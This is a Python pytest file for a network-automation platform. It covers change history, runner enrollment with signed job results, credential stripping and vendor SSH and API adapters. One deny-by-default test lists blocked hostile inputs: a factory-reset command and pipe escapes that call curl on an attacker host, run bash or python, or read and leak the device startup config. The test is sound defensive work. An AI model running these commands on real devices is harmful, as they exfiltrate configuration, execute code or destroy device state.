import hashlib
import json
import os
import subprocess
import zipfile
from io import BytesIO
from pathlib import Path

from fastapi.testclient import TestClient

from netcode.adapters.registry import AdapterRegistry
from netcode.adapters.rez import READ_TRANSPORTS, RezAdapterBridge
from netcode import api
from netcode.bootstrap import init_workspace
from netcode.discovery import DiscoveryService
from netcode.inventory import Device, Inventory
from netcode.jobs import JobRunner
from netcode.models import load_intent
from netcode.paths import WorkspacePaths
from netcode.platform import platform_capabilities
from netcode.source_of_truth import source_of_truth
from netcode.store import PlatformStore
from netcode.verification import verify_vlan_state
from netcode.workflow import state_after_lab_action, state_after_static_validation, workflow_snapshot
from netcode.yamlio import read_yaml, write_yaml


def test_platform_store_persists_changes_and_jobs(tmp_path: Path):
    paths = WorkspacePaths(tmp_path)
    init_workspace(paths)
    store = PlatformStore(paths)

    change = store.create_change(paths.intents / "examples" / "add_guest_vlan.yaml", "v2-store1")
    job = store.create_job(change.id, "dry-run")
    store.update_job(job.id, "completed", "done", {"status": "pass"})
    store.update_change(change.id, "completed", {"status": "pass"})

    reopened = PlatformStore(paths)
    changes = reopened.list_changes()
    jobs = reopened.list_jobs()

    assert changes[0].id == change.id
    assert changes[0].status == "completed"
    assert changes[0].last_job_id == job.id
    assert jobs[0].result == {"status": "pass"}


def test_change_history_search_is_indexed_bounded_and_tenant_scoped(tmp_path: Path, monkeypatch):
    workspace = WorkspacePaths(tmp_path)
    init_workspace(workspace)
    monkeypatch.chdir(tmp_path)
    store = PlatformStore(workspace)

    netcode_intent = workspace.intents / "history" / "campus-vlan.yaml"
    rez_intent = workspace.intents / "history" / "hq-rca.yaml"
    other_intent = workspace.intents / "history" / "other.yaml"
    for path, payload in (
        (
            netcode_intent,
            {
                "change_type": "add_vlan",
                "site": "campus",
                "targets": {"device_ids": ["campus-edge-1"]},
                "vlan": {"id": 210, "name": "APP", "subnet": "10.210.0.0/24"},
                "metadata": {"requested_by": "marcus@example.com", "source": "netcode"},
            },
        ),
        (
            rez_intent,
            {
                "change_type": "routing_redistribution",
                "site": "hq",
                "targets": {"device_ids": ["hq-edge-1"]},
                "metadata": {"requested_by": "rez-rca", "source": "rez_rca", "title": "Restore HQ exchange"},
            },
        ),
        (
            other_intent,
            {
                "change_type": "custom_config",
                "site": "private",
                "targets": {"device_ids": ["other-device"]},
                "metadata": {"requested_by": "other@example.com", "source": "netcode"},
            },
        ),
    ):
        path.parent.mkdir(parents=True, exist_ok=True)
        write_yaml(path, payload)

    vlan = store.create_change(netcode_intent, "campus-edge-1", requested_by="marcus@example.com")
    rca = store.create_change(rez_intent, "hq-edge-1", requested_by="rez-rca")
    store.update_change(rca.id, "validated", {"source": "rez_rca", "title": "Restore HQ exchange"}, workflow_state="validated")
    store.create_change(other_intent, "other-device", requested_by="other@example.com", org_id="org_other")

    rows, total = store.search_changes(org_id="org_default", site="camp", workflow_type="add_vlan")
    assert total == 1
    assert rows[0].id == vlan.id
    assert rows[0].source == "netcode"
    assert rows[0].site == "campus"

    rows, total = store.search_changes(org_id="org_default", query="Restore HQ", source="rez_rca", state="validated")
    assert total == 1
    assert rows[0].id == rca.id
    assert rows[0].title == "Restore HQ exchange"

    # Records created before indexed metadata existed remain discoverable after
    # an upgrade; compatibility does not rewrite their audit payloads.
    with store._connect() as conn:
        conn.execute("UPDATE changes SET source = '' WHERE id = ?", (rca.id,))
    rows, total = store.search_changes(org_id="org_default", source="rez_rca")
    assert total == 1
    assert rows[0].id == rca.id

    rows, total = store.search_changes(org_id="org_default", requested_by="marcus", limit=1, offset=0)
    assert total == 1
    assert len(rows) == 1
    assert all(row.org_id == "org_default" for row in rows)

    response = TestClient(api.app).get(
        "/api/changes",
        params={"q": "hq", "source": "rez_rca", "limit": 1, "offset": 0},
    )
    assert response.status_code == 200
    body = response.json()
    assert body["total"] == 1
    assert body["returned"] == 1
    assert body["next_offset"] is None
    assert body["device_connections_opened"] == 0
    assert body["changes"][0]["id"] == rca.id
    serialized = json.dumps(body["changes"][0])
    assert "intent_yaml" not in serialized
    assert "rendered_config" not in serialized
    assert str(tmp_path) not in serialized
    assert len(serialized) < 2_500


def test_rez_bridge_degrades_cleanly_when_unavailable(tmp_path: Path):
    bridge = RezAdapterBridge(root=tmp_path / "missing-rez")

    summary = bridge.summary()

    assert summary["available"] is False
    assert summary["platforms"] == []
    assert "Rez root not found" in str(summary["error"])


def test_rez_bridge_loads_driver_contract_from_configured_root(tmp_path: Path):
    rez_root = tmp_path / "rez"
    drivers = rez_root / "drivers"
    drivers.mkdir(parents=True)
    (drivers / "__init__.py").write_text("")
    (drivers / "collector.py").write_text(
        """
class FakeDriver:
    def __init__(self, host, username, password, port):
        self.host = host

    async def connect(self):
        return None

    async def disconnect(self):
        return None

    async def get_full_state(self):
        return {"layer2": {"vlans": [{"vlan_id": 90, "name": "GUEST_WIFI"}]}}

DRIVER_MAP = {"fake_os": FakeDriver}
""".strip()
    )
    bridge = RezAdapterBridge(root=rez_root)

    result = bridge.collect_device_state(
        Device(
            id="d1",
            host="127.0.0.1",
            platform="fake_os",
            username="u",
            password="p",
            port=22,
            hostname="d1",
            site="lab",
            groups=(),
        )
    )

    assert result["ok"] is True
    assert result["adapter"] == "rez.fake_os"
    assert result["state"] == {"layer2": {"vlans": [{"vlan_id": 90, "name": "GUEST_WIFI"}]}}
    assert bridge.platforms()["platforms"][0]["platform"] == "fake_os"


def test_inventory_preserves_runner_local_vendor_api_options(tmp_path: Path):
    inventory_path = tmp_path / "inventory.yaml"
    inventory_path.write_text(
        """
defaults:
  username: admin
  password: local-only
devices:
  - id: fgt-hub
    host: 127.0.0.1
    platform: fortinet
    port: 3122
    connection:
      transport: api
      ssh_port: 3122
      api_port: 3143
      api_token: token-local-only
      vdom: root
""".strip(),
        encoding="utf-8",
    )

    device = Inventory(inventory_path).by_id["fgt-hub"]

    assert device.port == 3122
    assert device.connection_options["transport"] == "api"
    assert device.connection_options["ssh_port"] == 3122
    assert device.connection_options["api_port"] == 3143
    assert device.connection_options["api_token"] == "token-local-only"
    assert "token-local-only" not in repr(device)


def test_rez_bridge_builds_vendor_specific_ssh_and_api_driver_contracts():
    captured: dict[str, dict] = {}

    def fake_driver(platform):
        class Driver:
            def __init__(self, **kwargs):
                captured[platform] = kwargs

        return Driver

    bridge = RezAdapterBridge(root="/missing")
    bridge._driver_map = {
        platform: fake_driver(platform)
        for platform in ("cisco_ios", "fortinet", "palo_alto", "meraki", "cisco_sdwan")
    }

    def device(platform, options=None, port=22):
        return Device(
            id=platform,
            host="192.0.2.10",
            platform=platform,
            username="operator",
            password="local-password",
            port=port,
            hostname=platform,
            site="lab",
            groups=(),
            connection_options=options or {},
        )

    bridge.build_driver(device("cisco_ios", {"ssh_port": 2222}))
    bridge.build_driver(device("fortinet", {"ssh_port": 2223, "api_port": 8443, "api_token": "fgt-token"}))
    bridge.build_driver(device("palo_alto", {"transport": "api", "ssh_port": 2224, "api_port": 9443}))
    bridge.build_driver(device("meraki", {"api_key": "meraki-key", "organization_id": "org-1", "network_id": "net-1"}))
    bridge.build_driver(device("cisco_sdwan", {"api_port": 8443, "managed_device_id": "10.0.0.1"}))

    assert captured["cisco_ios"]["port"] == 2222
    assert captured["fortinet"] | {"password": "redacted"} == {
        "hostname": "192.0.2.10",
        "username": "operator",
        "password": "redacted",
        "port": 8443,
        "ssh_port": 2223,
        "api_token": "fgt-token",
        "use_api": True,
        "verify_ssl": False,
        "vdom": "root",
    }
    assert captured["palo_alto"]["use_api"] is True
    assert captured["palo_alto"]["port"] == 9443
    assert captured["palo_alto"]["ssh_port"] == 2224
    assert captured["meraki"]["api_key"] == "meraki-key"
    assert captured["meraki"]["organization_id"] == "org-1"
    assert captured["cisco_sdwan"]["device_id"] == "10.0.0.1"
    assert captured["cisco_sdwan"]["port"] == 8443


def test_discovery_service_builds_source_of_truth_candidate(tmp_path: Path):
    paths = WorkspacePaths(tmp_path)
    init_workspace(paths)

    class FakeRez:
        def normalize_platform(self, value):
            return value or ""

        def driver_map(self):
            return {"arista_eos": object}

        def summary(self):
            return {"error": None}

        def collect_device_state(self, device):
            return {
                "ok": True,
                "adapter": f"rez.{device.platform}",
                "driver": "drivers.arista_eos.AsyncAristaEOSDriver",
                "state": {
                    "device": {"hostname": "leaf1", "model": "vEOS"},
                    "layer2": {"vlans": [{"vlan_id": 10}, {"vlan_id": 20}]},
                    "interfaces": {"Ethernet1": {}, "Ethernet2": {}},
                },
                "warnings": [],
                "errors": [],
                "collection_time": 0.01,
            }

    result = DiscoveryService(paths, rez=FakeRez()).scan(
        host="172.100.1.41",
        platform="arista_eos",
        username="admin",
        password="admin",
        device_id="leaf1",
        site="lab",
    )

    assert result["ok"] is True
    assert result["platform"] == "arista_eos"
    assert result["source_of_truth_candidate"]["host"] == "172.100.1.41"
    assert result["source_of_truth_candidate"]["platform"] == "arista_eos"
    assert "leaf1" in result["source_of_truth_yaml"]
    assert result["safety"]["device_writes"] == "none"


def test_discovery_import_updates_local_source_of_truth_without_password(tmp_path: Path):
    paths = WorkspacePaths(tmp_path)
    init_workspace(paths)

    candidate = {
        "id": "core1",
        "hostname": "core1",
        "host": "192.0.2.10",
        "platform": "cisco_ios",
        "site": "dc1",
        "groups": ["core"],
        "port": 22,
        "password": "do-not-store",
    }

    result = DiscoveryService(paths).import_candidate(candidate)
    inventory = Inventory(paths.inventories / "lab.yaml")

    assert result["ok"] is True
    assert inventory.by_id["core1"].host == "192.0.2.10"
    assert inventory.by_id["core1"].platform == "cisco_ios"
    assert "password" not in result["device"]


def test_adapter_registry_reports_execution_and_rez_state_contract(tmp_path: Path):
    paths = WorkspacePaths(tmp_path)
    init_workspace(paths)
    device = Inventory(paths.inventories / "lab.yaml").by_id["v2-store1"]

    registry = AdapterRegistry(rez=RezAdapterBridge(root=tmp_path / "missing-rez"))
    capabilities = registry.device_capabilities(device)

    assert capabilities["execution"]["name"] == "netcode.arista_config_session"
    assert capabilities["state"]["provider"] == "rez"
    assert capabilities["state"]["available"] is False
    assert capabilities["state"]["supported"] is False


def test_source_of_truth_snapshot_exposes_inventory_policy_and_templates(tmp_path: Path):
    paths = WorkspacePaths(tmp_path)
    init_workspace(paths)

    snapshot = source_of_truth(paths)

    assert snapshot["ok"] is True
    assert snapshot["provider"] == "local_yaml"
    assert snapshot["summary"]["device_count"] >= 1
    assert any(device["id"] == "v2-store1" for device in snapshot["devices"])
    assert "arista_eos" in snapshot["platforms"]
    assert snapshot["policies"]
    assert snapshot["templates"]


def test_workflow_contract_blocks_apply_until_dry_run_passes():
    validated = state_after_static_validation(True).as_dict()
    blocked = state_after_static_validation(False).as_dict()
    after_dry_run = state_after_lab_action("dry-run", True).as_dict()

    assert "dry_run" in validated["allowed_actions"]
    assert "apply" in validated["blocked_actions"]
    assert "check_safety" in blocked["allowed_actions"]
    assert "apply" in after_dry_run["allowed_actions"]
    assert workflow_snapshot("rollback_available").as_dict()["allowed_actions"] == ["check_safety", "collect_state", "dry_run", "rollback"]


def test_verify_vlan_state_from_rez_shapes():
    state_result = {
        "ok": True,
        "adapter": "rez.fake_os",
        "state": {"layer2": {"vlans": {"90": {"id": "90", "name": "GUEST_WIFI"}}}},
    }

    present = verify_vlan_state(state_result, 90, "GUEST_WIFI", present=True)
    absent = verify_vlan_state(state_result, 91, present=False)
    missing = verify_vlan_state(state_result, 91, present=True)

    assert present["status"] == "pass"
    assert absent["status"] == "pass"
    assert missing["status"] == "fail"


def test_new_phase_api_endpoints(tmp_path: Path, monkeypatch):
    init_workspace(WorkspacePaths(tmp_path))
    monkeypatch.chdir(tmp_path)
    client = TestClient(api.app)

    source = client.get("/api/source-of-truth")
    workflow = client.get("/api/workflow/state/validated")
    rez_health = client.get("/api/adapters/rez/health")
    adapters = client.get("/api/adapters")

    assert source.status_code == 200
    assert source.json()["summary"]["device_count"] >= 1
    assert workflow.status_code == 200
    assert "dry_run" in workflow.json()["allowed_actions"]
    assert rez_health.status_code == 200
    assert "driver_registry" in rez_health.json()
    assert adapters.status_code == 200
    assert "adapter_matrix" in adapters.json()


def test_job_runner_records_failed_lab_action(monkeypatch, tmp_path: Path):
    paths = WorkspacePaths(tmp_path)
    init_workspace(paths)
    store = PlatformStore(paths)
    change = store.get_or_create_change(paths.intents / "examples" / "add_guest_vlan.yaml", "v2-store1")
    store.update_change(change.id, "validated", {"unit": True}, workflow_state="validated")

    def fake_run_lab_action(paths, intent_path, action, device_id):
        return {"status": "fail", "message": "blocked", "evidence": {"reason": "unit-test"}}

    monkeypatch.setattr("netcode.jobs.run_lab_action", fake_run_lab_action)

    result = JobRunner(paths, store=store).run_lab_action(paths.intents / "examples" / "add_guest_vlan.yaml", "dry-run", "v2-store1", change.id)
    jobs = store.list_jobs()

    assert result["ok"] is False
    assert result["job"]["status"] == "failed"
    assert jobs[0].message == "blocked"


def test_runner_enroll_queue_claim_signed_result_roundtrip(tmp_path: Path, monkeypatch):
    """M1/M2: full SaaS-split round trip — enroll, queue (runner mode), claim, sign, submit."""
    import hashlib
    import hmac as hmac_mod

    from netcode.runner_hub import canonical_json

    init_workspace(WorkspacePaths(tmp_path))
    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv("NETCODE_EXECUTION", "runner")
    monkeypatch.setenv("NETCODE_RUNNER_POOL", "store-lab")
    client = TestClient(api.app)

    # Enroll: bad token rejected, good token works, replay rejected.
    mint = client.post("/api/runners/join-token", json={"pool": "store-lab"}).json()
    assert mint["ok"] and mint["join_token"].startswith("njt_")
    assert client.post("/api/runner/enroll", json={"join_token": "bogus", "name": "x"}).json()["ok"] is False
    enroll = client.post("/api/runner/enroll", json={"join_token": mint["join_token"], "name": "clab-runner-1"}).json()
    assert enroll["ok"] and enroll["pool"] == "store-lab"
    token, secret = enroll["runner_token"], enroll["hmac_secret"]
    replay = client.post("/api/runner/enroll", json={"join_token": mint["join_token"], "name": "y"}).json()
    assert replay["ok"] is False  # single-use

    auth = {"Authorization": f"Bearer {token}"}

    # Plan a change (local pipeline, no device) and queue a dry-run for the runner.
    plan = client.post(
        "/api/desired-state/plan",
        json={"change_type": "add_vlan", "site": "store-1842", "device_id": "v2-store1", "requested_by": "unit",
              "values": {"vlan_id": 90, "name": "GUEST_WIFI", "subnet": "10.42.90.0/24", "purpose": "guest"}},
    ).json()
    change_id = plan["change"]["id"]
    dry = client.post("/api/lab/dry-run", json={"intent_path": plan["intent_path"], "device_id": "v2-store1", "change_id": change_id}).json()
    assert dry["queued"] is True
    assert dry["job"]["status"] == "queued"

    # CREDENTIAL CUSTODY INVARIANT: the queued payload must never carry a password.
    payload = dry["job"]["payload"]
    assert "admin" not in json.dumps(payload)  # inventory default password is "admin"
    assert set(payload["device"].keys()) == {"id", "host", "platform", "port"}

    # Runner claims the job via long-poll.
    claim = client.post("/api/runner/poll", json={"wait_seconds": 0}, headers=auth).json()
    assert claim["ok"] and claim["job"]["id"] == dry["job"]["id"]
    assert claim["job"]["status"] == "running"
    assert claim["job"]["claimed_by"]
    assert claim["job"]["lease_token"].startswith("jlt_")
    assert claim["job"]["lease_seconds"] >= 30
    listed_claim = next(
        item for item in client.get("/api/jobs").json()["jobs"] if item["id"] == dry["job"]["id"]
    )
    assert "lease_token" not in listed_claim
    assert client.post(
        f"/api/runner/jobs/{dry['job']['id']}/lease",
        json={"lease_token": "jlt_stale"},
        headers=auth,
    ).status_code == 409
    renewed = client.post(
        f"/api/runner/jobs/{dry['job']['id']}/lease",
        json={"lease_token": claim["job"]["lease_token"]},
        headers=auth,
    )
    assert renewed.status_code == 200 and renewed.json()["lease_expires_at"]

    # A second poll returns 204 (no more work).
    assert client.post("/api/runner/poll", json={"wait_seconds": 0}, headers=auth).status_code == 204

    # Bad signature is rejected (control plane does not trust an unsigned result).
    good_result = {"status": "pass", "action": "dry-run", "device_id": "v2-store1", "message": "diff captured, session aborted",
                   "evidence": {"transcript": [{"command": "show session-config diffs", "output": "+vlan 90"}]}}
    bad = client.post(
        f"/api/runner/jobs/{dry['job']['id']}/result",
        json={"result": good_result, "signature": "deadbeef", "lease_token": claim["job"]["lease_token"]},
        headers=auth,
    ).json()
    assert bad["ok"] is False and "signature" in bad["message"].lower()

    # Correctly-signed result advances the change to dry_run_passed.
    sig = hmac_mod.new(secret.encode(), canonical_json(good_result).encode(), hashlib.sha256).hexdigest()
    submit = client.post(
        f"/api/runner/jobs/{dry['job']['id']}/result",
        json={"result": good_result, "signature": sig, "lease_token": claim["job"]["lease_token"]},
        headers=auth,
    ).json()
    assert submit["ok"] is True
    assert submit["workflow_state"] == "dry_run_passed"
    assert submit["job"]["status"] == "completed"

    # Runner shows up in the registry as online.
    runners = client.get("/api/runners").json()
    assert runners["count"] == 1 and runners["runners"][0]["status"] == "online"

    # Unauthenticated runner calls are refused.
    assert client.post("/api/runner/poll", json={"wait_seconds": 0}).status_code == 401

    # M3: the UI polls a single-job endpoint to a terminal state; health exposes the mode.
    single = client.get(f"/api/jobs/{dry['job']['id']}")
    assert single.status_code == 200
    assert single.json()["status"] == "completed"
    assert single.json()["result"]["status"] == "pass"
    assert client.get("/api/jobs/not-a-job").status_code == 404
    assert client.get("/api/health").json()["execution"]["mode"] == "runner"


def test_runner_read_job_routing_roundtrip(tmp_path: Path, monkeypatch):
    """Read-routing: in runner mode a device read is queued as a read job, the runner
    claims it, returns a signed result, and the control plane returns that result."""
    import hashlib
    import hmac as hmac_mod
    import threading
    import time

    from netcode.runner_hub import canonical_json

    init_workspace(WorkspacePaths(tmp_path))
    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv("NETCODE_EXECUTION", "runner")
    monkeypatch.setenv("NETCODE_RUNNER_POOL", "store-lab")
    client = TestClient(api.app)

    enroll = client.post("/api/runner/enroll", json={"join_token": client.post("/api/runners/join-token", json={"pool": "store-lab"}).json()["join_token"], "name": "r1"}).json()
    token, secret = enroll["runner_token"], enroll["hmac_secret"]
    auth = {"Authorization": f"Bearer {token}"}

    # A stand-in runner: claim the queued read job, return a canned readiness result.
    canned = {"ok": True, "tested": 3, "readable": 3, "devices": [{"id": "v2-store1", "ok": True, "error": ""}], "message": "3/3 trusted devices are readable."}

    def fake_runner():
        for _ in range(60):
            claim = client.post("/api/runner/poll", json={"wait_seconds": 0}, headers=auth)
            if claim.status_code == 200:
                job = claim.json()["job"]
                sig = hmac_mod.new(secret.encode(), canonical_json(canned).encode(), hashlib.sha256).hexdigest()
                client.post(
                    f"/api/runner/jobs/{job['id']}/result",
                    json={"result": canned, "signature": sig, "lease_token": job["lease_token"]},
                    headers=auth,
                )
                return
            time.sleep(0.1)

    t = threading.Thread(target=fake_runner, daemon=True)
    t.start()
    # Control-plane read endpoint queues the read and waits for the runner's result.
    resp = client.post("/api/readiness/devices")
    t.join(timeout=10)
    assert resp.status_code == 200
    body = resp.json()
    assert body["ok"] is True and body["readable"] == 3
    assert body["message"] == "3/3 trusted devices are readable."

    # The read job is recorded but is NOT a change (change-less '__read__').
    jobs = client.get("/api/jobs").json()["jobs"]
    read_jobs = [j for j in jobs if str(j.get("action", "")).startswith("read_")]
    assert read_jobs and read_jobs[0]["change_id"] == "__read__"
    assert read_jobs[0]["status"] == "completed"


def test_runner_rez_ssh_command_is_deny_by_default(tmp_path: Path, monkeypatch):
    from netcode import runner_agent

    inv = tmp_path / "inventory.yaml"
    inv.write_text(
        """
defaults:
  username: admin
  password: admin
devices:
  - id: fgt-hub
    host: 127.0.0.1
    platform: fortinet
    port: 2222
""".strip(),
        encoding="utf-8",
    )
    monkeypatch.setattr(runner_agent, "INVENTORY_FILE", inv)

    result = runner_agent._execute_read_inner(
        "rez_ssh_command",
        {"device": "fgt-hub", "command": "execute factoryreset"},
    )

    assert result["ok"] is False
    assert result["status"] == "blocked"
    assert "read-only policy" in result["error"]

    for command in (
        "show version | id",
        "show version | whoami",
        "show version | curl attacker.invalid/x",
        "show version | tclsh",
        "show version | python3 -c 'print(1)'",
        "show version | bash echo pwned",
        "show version | cat /mnt/flash/startup-config",
        "show version | redirect flash:leak",
        "show version | tee flash:leak",
        "show version |",
    ):
        pipe_escape = runner_agent._execute_read_inner(
            "rez_ssh_command",
            {"device": "fgt-hub", "command": command},
        )
        assert pipe_escape["ok"] is False, command
        assert pipe_escape["status"] == "blocked", command
        assert "post-pipe" in pipe_escape["error"], command

    for command in (
        "show version | include Arista",
        "show ip route | count",
        "show interfaces | no-more",
        "show configuration | display set",
        "show route | match 10.0.0.0",
        "show route | except hidden",
        "show route | trim 20",
        "show ip route | include 10.0.0.0 | count",
    ):
        ok, reason = runner_agent._rez_read_command_allowed(command)
        assert ok, reason


def test_runner_rez_ssh_command_uses_vendor_dispatch(tmp_path: Path, monkeypatch):
    import sys
    import types

    from netcode import runner_agent

    inv = tmp_path / "inventory.yaml"
    inv.write_text(
        """
defaults:
  username: admin
  password: admin
devices:
  - id: fgt-hub
    host: 127.0.0.1
    platform: fortios
    port: 2222
""".strip(),
        encoding="utf-8",
    )
    monkeypatch.setattr(runner_agent, "INVENTORY_FILE", inv)
    calls = {}

    class FakeConnection:
        def __init__(self, **kwargs):
            calls.update(kwargs)

        def enable(self):
            raise RuntimeError("no enable")

        def send_command(self, command, **kwargs):  # noqa: ANN001
            return f"ran {command}"

        def disconnect(self):
            calls["disconnect"] = True

    monkeypatch.setitem(sys.modules, "netmiko", types.SimpleNamespace(ConnectHandler=FakeConnection))

    result = runner_agent._execute_read_inner(
        "rez_ssh_command",
        {"device": "FGT-HUB", "command": "get system status"},
    )

    assert result["ok"] is True
    assert result["stdout"] == "ran get system status"
    assert calls["device_type"] == "fortinet"
    assert calls["host"] == "127.0.0.1"
    assert calls["port"] == 2222
    assert calls["disconnect"] is True


def test_runner_typed_reachability_checks_require_real_ping_success(monkeypatch):
    from types import SimpleNamespace

    from netcode import runner_agent

    intent = SimpleNamespace(
        reachability_checks=[
            SimpleNamespace(source_device="campus-core", source_ip="3.3.3.1", destination="1.1.1.2"),
            SimpleNamespace(source_device="campus-core", source_ip="3.3.3.1", destination="4.4.4.1"),
        ]
    )

    def fake_ssh(payload):  # noqa: ANN001
        destination = str(payload["command"]).split()[1]
        received = "5 received, 0% packet loss" if destination == "1.1.1.2" else "0 received, 100% packet loss"
        return {"ok": True, "stdout": received}

    monkeypatch.setattr(runner_agent, "_execute_rez_ssh_command", fake_ssh)
    result = runner_agent._execute_routing_reachability_checks(intent)

    assert result["passed"] is False
    assert [item["passed"] for item in result["checks"]] == [True, False]
    assert result["checks"][0]["command"] == "ping 1.1.1.2 source 3.3.3.1"


def test_vendor_aware_shell_uses_runner_local_ssh_port(monkeypatch):
    import sys
    import types

    from netcode.adapters.shell import NetmikoShellAdapter

    calls = {}

    class FakeConnection:
        def __init__(self, **kwargs):
            calls.update(kwargs)

        def enable(self):
            raise RuntimeError("no IOS enable mode")

        def send_command_timing(self, command, **kwargs):  # noqa: ANN001
            calls["command"] = command
            return "FortiGate output"

        def disconnect(self):
            calls["disconnected"] = True

    monkeypatch.setitem(sys.modules, "netmiko", types.SimpleNamespace(ConnectHandler=FakeConnection))
    device = Device(
        id="fgt-hub",
        host="127.0.0.1",
        platform="fortinet",
        username="admin",
        password="local-only",
        port=8443,
        hostname="fgt-hub",
        site="lab",
        groups=(),
        connection_options={"ssh_port": 2222, "api_port": 8443, "api_token": "local-token"},
    )

    adapter = NetmikoShellAdapter(device)
    adapter.connect()
    output = adapter.show("get system status")
    adapter.disconnect()

    assert output == "FortiGate output"
    assert calls["device_type"] == "fortinet"
    assert calls["port"] == 2222
    assert calls["command"] == "get system status"
    assert calls["disconnected"] is True


def test_vendor_aware_shell_rejects_api_only_controller():
    from netcode.adapters.shell import netmiko_device_type

    try:
        netmiko_device_type("meraki")
    except ValueError as exc:
        assert "API-only" in str(exc)
    else:  # pragma: no cover - explicit failure message
        raise AssertionError("Meraki Dashboard must not be presented as an SSH Shell target")


def test_interactive_pty_uses_ssh_port_not_vendor_api_port(monkeypatch):
    import sys
    import types

    from netcode.shell_guard import ShellSessionState
    from netcode.shell_pty import InteractivePtySession

    calls = {}

    class FakeChannel:
        def settimeout(self, _timeout):
            return None

        def recv_ready(self):
            return False

        def close(self):
            return None

    class FakeClient:
        def set_missing_host_key_policy(self, _policy):
            return None

        def connect(self, host, **kwargs):  # noqa: ANN001
            calls.update({"host": host, **kwargs})

        def invoke_shell(self, **_kwargs):
            return FakeChannel()

        def close(self):
            return None

    fake_paramiko = types.SimpleNamespace(SSHClient=FakeClient, AutoAddPolicy=lambda: object())
    monkeypatch.setitem(sys.modules, "paramiko", fake_paramiko)
    device = Device(
        id="pan-edge",
        host="192.0.2.20",
        platform="palo_alto",
        username="admin",
        password="local-only",
        port=9443,
        hostname="pan-edge",
        site="lab",
        groups=(),
        connection_options={"api_port": 9443, "ssh_port": 2222},
    )
    session = InteractivePtySession(
        device,
        ShellSessionState(mode="direct"),
        on_output=lambda _data: None,
        on_event=lambda _event: None,
    )

    session.open()
    session.close()

    assert calls["host"] == "192.0.2.20"
    assert calls["port"] == 2222


def test_interactive_pty_audit_resolves_terminal_history_without_logging_escape_bytes():
    from netcode.shell_guard import ShellSessionState
    from netcode.shell_pty import InteractivePtySession

    events = []
    session = InteractivePtySession(
        Device(
            id="edge-1",
            host="192.0.2.10",
            platform="arista_eos",
            username="admin",
            password="local-only",
            port=22,
            hostname="edge-1",
            site="lab",
            groups=(),
        ),
        ShellSessionState(mode="direct"),
        on_output=lambda _data: None,
        on_event=events.append,
    )

    session._record_direct_input("show hostname\r")
    session._record_direct_input("\x1b[A\r")

    commands = [event["line"] for event in events if event.get("type") == "command"]
    assert commands == ["show hostname", "show hostname"]


def test_runner_rest_shell_persists_cli_mode_per_session(tmp_path: Path, monkeypatch):
    from netcode import runner_agent
    from netcode.adapters import shell

    inv = tmp_path / "inventory.yaml"
    inv.write_text(
        """
defaults:
  username: admin
  password: admin
devices:
  - id: v2-store1
    host: 127.0.0.1
    platform: arista_eos
    port: 2222
""".strip(),
        encoding="utf-8",
    )
    monkeypatch.setattr(runner_agent, "INVENTORY_FILE", inv)
    runner_agent._SHELL_ADAPTERS.clear()
    created = []

    class FakeShellAdapter:
        def __init__(self, device):
            self.device = device
            self.connected = False
            self.in_config = False
            self.commands = []
            self.disconnects = 0
            created.append(self)

        def connect(self):
            self.connected = True

        def disconnect(self):
            self.disconnects += 1
            self.connected = False

        def show(self, command):
            self.commands.append(command)
            normalized = " ".join(command.lower().split())
            if normalized in ("configure terminal", "conf t", "configure"):
                self.in_config = True
                return "config"
            if normalized == "end":
                self.in_config = False
                return "end"
            if normalized.startswith("interface "):
                if not self.in_config:
                    raise RuntimeError("not in config mode")
                return "interface"
            return "ok"

    monkeypatch.setattr(shell, "NetmikoShellAdapter", FakeShellAdapter)

    base_payload = {
        "device_id": "v2-store1",
        "session_id": "session-a",
        "state": {"mode": "direct", "guard_enabled": False},
    }
    first = runner_agent._execute_read_inner("shell", {**base_payload, "input": "configure terminal"})
    second = runner_agent._execute_read_inner("shell", {**base_payload, "state": first["state"], "input": "interface Loopback101"})

    assert first["executed"] is True
    assert second["executed"] is True
    assert len(created) == 1
    assert created[0].commands == ["configure terminal", "interface Loopback101"]

    isolated = runner_agent._execute_read_inner(
        "shell",
        {
            "device_id": "v2-store1",
            "session_id": "session-b",
            "state": {"mode": "direct", "guard_enabled": False},
            "input": "interface Loopback202",
        },
    )

    assert isolated["executed"] is False
    assert "not in config mode" in isolated["output"]
    assert len(created) == 2
    runner_agent._SHELL_ADAPTERS.clear()


def test_rez_runner_read_endpoint_strips_credentials_and_queues_only_supported_action(tmp_path: Path, monkeypatch):
    init_workspace(WorkspacePaths(tmp_path))
    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv("NETCODE_EXECUTION", "runner")
    monkeypatch.setenv("NETCODE_RUNNER_POOL", "store-lab")

    class FastClock:
        current = 0.0

        @classmethod
        def monotonic(cls):
            cls.current += 1.0
            return cls.current

        @staticmethod
        def sleep(_seconds):  # noqa: ANN001
            return None

    monkeypatch.setattr(api, "time", FastClock)
    client = TestClient(api.app)

    blocked = client.post("/api/rez/runner-read", json={"action": "discovery", "payload": {}})
    assert blocked.status_code == 400

    resp = client.post(
        "/api/rez/runner-read",
        json={
            "action": "rez_ssh_command",
            "timeout": 1,
            "payload": {
                "device": "v2-store1",
                "command": "show version",
                "username": "should-not-queue",
                "password": "should-not-queue",
            },
        },
    )
    assert resp.status_code == 200
    jobs = client.get("/api/jobs").json()["jobs"]
    read_jobs = [j for j in jobs if j["action"] == "read_rez_ssh_command"]
    assert read_jobs
    payload = read_jobs[0]["payload"]
    assert payload["device"] == "v2-store1"
    assert payload["command"] == "show version"
    assert payload["_runner_timeout_seconds"] == 1.0
    assert "username" not in payload and "password" not in payload

    scan_resp = client.post(
        "/api/rez/runner-read",
        json={
            "action": "rez_scan_device",
            "timeout": 1,
            "payload": {
                "host": "192.0.2.10",
                "platform": "arista_eos",
                "username": "should-not-queue",
                "password": "should-not-queue",
            },
        },
    )
    assert scan_resp.status_code == 200
    jobs = client.get("/api/jobs").json()["jobs"]
    scan_jobs = [j for j in jobs if j["action"] == "read_rez_scan_device"]
    assert scan_jobs
    scan_payload = scan_jobs[0]["payload"]
    assert scan_payload["host"] == "192.0.2.10"
    assert scan_payload["platform"] == "arista_eos"
    assert scan_payload["_runner_timeout_seconds"] == 1.0
    assert "username" not in scan_payload and "password" not in scan_payload

    probe_resp = client.post(
        "/api/rez/runner-read",
        json={
            "action": "rez_server_listener_probe",
            "timeout": 1,
            "payload": {
                "source_device": "arista-dc",
                "src_ip": "10.10.0.10",
                "dst_ip": "10.20.0.10",
                "dst_port": 443,
                "username": "should-not-queue",
                "password": "should-not-queue",
            },
        },
    )
    assert probe_resp.status_code == 200
